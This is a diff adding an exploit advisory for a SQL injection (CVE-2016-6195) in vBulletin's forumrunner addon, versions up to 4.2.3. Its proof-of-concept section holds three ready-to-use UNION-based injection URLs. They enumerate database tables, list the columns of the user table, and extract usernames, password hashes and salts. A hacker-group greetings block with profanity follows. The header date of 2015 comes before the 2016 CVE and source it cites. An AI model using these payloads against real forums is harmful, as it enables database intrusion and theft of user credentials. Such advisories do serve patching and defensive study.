@@ -1,0 +1,55 @@
+##################################################################################################
+#Exploit Title : vBulletin <= 4.2.3 SQL Injection (CVE-2016-6195)
+#Author        : Manish Kishan Tanwar AKA error1046 (https://twitter.com/IndiShell1046)
+#Date          : 25/08/2015
+#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
+#Tested At  : Indishell Lab(originally developed by Dantalion)
+##################################################################################################
+ 
+////////////////////////
+/// Overview:
+////////////////////////
+ 
+VBulletin version 3.6.0 through 4.2.3 are vulnerable to SQL injection vulnerability in vBulletin core forumrunner addon. 
+Vulnerability was analized and documented by Dantalion (https://enumerated.wordpress.com/2016/07/11/1/) 
+so credit goes to Dantalion only :) 
+
+ 
+  
+ 
+////////////////
+///  POC   ////
+///////////////
+
+SQL Injection payload to enumerate table names
+----------------------------------------------
+http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -
+
+
+SQL Injection payload to enumerate column names from table "user"
+----------------------------------------------------------------
+http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.columns)where (table_name=0x75736572) and (0x00) in (@x:=concat(@x,0x3c62723e,column_name))))x),5,6,7,8,9,10-- -
+
+
+SQL Injection payload to enumerate username,password hash and salt from "user" table
+----------------------------------------------------------------------------------
+http://forum_directory//forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -
+
+/////////////////
+exploit code ends here
+ 
+ 
+ 
+ 
+                             --==[[ Greetz To ]]==--
+############################################################################################
+#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
+#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
+#Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
+#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash
+#############################################################################################
+                             --==[[Love to]]==--
+# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
+#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty, Hacker fantastic, Jennifer Arcuri and Don(Deepika kaushik)
+                       --==[[ Special Fuck goes to ]]==--
+                            <3  suriya Cyber Tyson <3
